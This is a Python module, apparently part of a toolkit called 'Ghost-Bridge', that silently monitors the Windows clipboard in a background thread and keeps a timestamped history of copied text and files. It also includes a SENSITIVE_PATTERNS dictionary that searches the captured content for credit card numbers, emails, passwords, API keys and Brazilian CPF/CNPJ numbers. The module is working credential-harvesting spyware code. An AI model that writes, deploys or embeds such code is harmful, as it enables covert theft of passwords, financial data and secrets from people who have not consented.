"""
Ghost-Bridge - Clipboard Monitor
Monitora e captura conteúdo da área de transferência.
"""
import threading
import time
from datetime import datetime

try:
    import win32clipboard
    import win32con
    PYWIN32_AVAILABLE = True
except ImportError:
    PYWIN32_AVAILABLE = False


class ClipboardMonitor:
    """
    Monitor de clipboard com histórico.
    
    Features:
    - Captura texto copiado
    - Detecta mudanças automaticamente
    - Mantém histórico com timestamps
    - Filtra duplicatas consecutivas
    """
    
    def __init__(self, max_history=100):
        """
        Args:
            max_history: Máximo de itens no histórico
        """
        if not PYWIN32_AVAILABLE:
            raise ImportError("[!] pywin32 não instalado. Execute: pip install pywin32")
        
        self.max_history = max_history
        self.history = []
        self.last_content = ""
        self.running = False
        self.lock = threading.Lock()
    
    def _get_clipboard_text(self):
        """Obtém texto do clipboard."""
        try:
            win32clipboard.OpenClipboard()
            try:
                if win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
                    data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
                    return data
                elif win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                    data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
                    return data.decode('utf-8', errors='ignore')
            finally:
                win32clipboard.CloseClipboard()
        except:
            pass
        return None
    
    def _get_clipboard_files(self):
        """Obtém lista de arquivos do clipboard."""
        try:
            win32clipboard.OpenClipboard()
            try:
                if win32clipboard.IsClipboardFormatAvailable(win32con.CF_HDROP):
                    import win32api
                    data = win32clipboard.GetClipboardData(win32con.CF_HDROP)
                    # Lista de arquivos
                    return list(data)
            finally:
                win32clipboard.CloseClipboard()
        except:
            pass
        return None
    
    def capture_now(self):
        """Captura conteúdo atual do clipboard."""
        text = self._get_clipboard_text()
        files = self._get_clipboard_files()
        
        result = {
            'timestamp': datetime.now().isoformat(),
            'type': None,
            'content': None
        }
        
        if text:
            result['type'] = 'text'
            result['content'] = text[:5000]  # Limita tamanho
            result['length'] = len(text)
        elif files:
            result['type'] = 'files'
            result['content'] = files[:20]  # Limita quantidade
            result['count'] = len(files)
        
        return result if result['content'] else None
    
    def start(self, interval=1.0):
        """
        Inicia monitoramento em background.
        
        Args:
            interval: Segundos entre verificações
        """
        self.running = True
        
        def loop():
            while self.running:
                try:
                    text = self._get_clipboard_text()
                    
                    if text and text != self.last_content:
                        self.last_content = text
                        
                        entry = {
                            'timestamp': datetime.now().isoformat(),
                            'type': 'text',
                            'content': text[:5000],
                            'length': len(text)
                        }
                        
                        with self.lock:
                            self.history.append(entry)
                            
                            # Mantém limite
                            if len(self.history) > self.max_history:
                                self.history.pop(0)
                
                except Exception as e:
                    pass
                
                time.sleep(interval)
        
        thread = threading.Thread(target=loop, daemon=True)
        thread.start()
        print("[+] Monitor de Clipboard iniciado")
    
    def stop(self):
        """Para o monitoramento."""
        self.running = False
    
    def get_history(self, clear=True):
        """
        Retorna histórico capturado.
        
        Args:
            clear: Se True, limpa histórico após retornar
        """
        with self.lock:
            history = self.history.copy()
            if clear:
                self.history = []
            return history
    
    def search_patterns(self, patterns):
        """
        Busca padrões sensíveis no histórico.
        
        Args:
            patterns: Dict de nome -> regex
            
        Returns:
            Lista de matches encontrados
        """
        import re
        
        matches = []
        with self.lock:
            for entry in self.history:
                content = entry.get('content', '')
                if not content:
                    continue
                
                for name, pattern in patterns.items():
                    found = re.findall(pattern, content, re.IGNORECASE)
                    if found:
                        matches.append({
                            'timestamp': entry['timestamp'],
                            'pattern': name,
                            'matches': found[:5]  # Limita
                        })
        
        return matches


# Padrões sensíveis comuns
SENSITIVE_PATTERNS = {
    'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
    'email': r'\b[\w.-]+@[\w.-]+\.\w+\b',
    'password': r'(?:senha|password|pwd)[:\s]*[\w@#$%^&*]+',
    'api_key': r'(?:api[_-]?key|token)[:\s]*[\w-]{20,}',
    'cpf': r'\b\d{3}\.?\d{3}\.?\d{3}-?\d{2}\b',
    'cnpj': r'\b\d{2}\.?\d{3}\.?\d{3}/?\d{4}-?\d{2}\b',
}


# Teste standalone
if __name__ == "__main__":
    print("[*] Teste do Clipboard Monitor")
    print("[*] Copie textos para testar (Ctrl+C para parar)")
    
    cm = ClipboardMonitor()
    cm.start()
    
    try:
        while True:
            time.sleep(3)
            history = cm.get_history(clear=False)
            if history:
                print(f"\n[Histórico]: {len(history)} itens")
                for item in history[-3:]:
                    preview = item['content'][:50] + "..." if len(item['content']) > 50 else item['content']
                    print(f"  - {item['timestamp']}: {preview}")
    except KeyboardInterrupt:
        cm.stop()
